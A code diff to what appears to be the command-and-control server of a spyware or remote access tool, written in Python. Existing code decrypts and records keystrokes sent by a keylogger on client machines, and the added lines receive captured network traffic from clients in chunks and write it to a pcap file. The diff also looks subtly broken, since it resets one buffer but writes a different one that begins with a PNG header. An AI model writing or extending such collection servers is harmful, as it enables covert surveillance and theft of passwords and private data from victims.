@@ -24,6 +24,7 @@ class Server:
             self.result = ''
             self.cond = True
             self.total_data = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
+            self.pcap_data = b''
             self.connections = []
             # self.result += EncodeImg.restor_message('1.png')
         except ValueError as e:
@@ -95,6 +96,16 @@ class Server:
                         cipher = AESCipher(str(self.shared_key))
                         data_decrypt = cipher.decrypt(data[1:])
                         self.result += "Key logger sent: {}".format(data_decrypt.decode('utf-8', 'ignore'))
+                    elif data[:1] == b'7' or data[:1] == '7':
+                        if data == '7finish':
+                            new_file = open("1.pcap", "wb")
+                            # write to file
+                            new_file.write(self.total_data)
+                            new_file.close()
+                            self.pcap_data = b''
+                            self.result += "pcap file was dumped"
+                        else:
+                            self.total_data += data[1:]
 
 
             except socket.timeout:
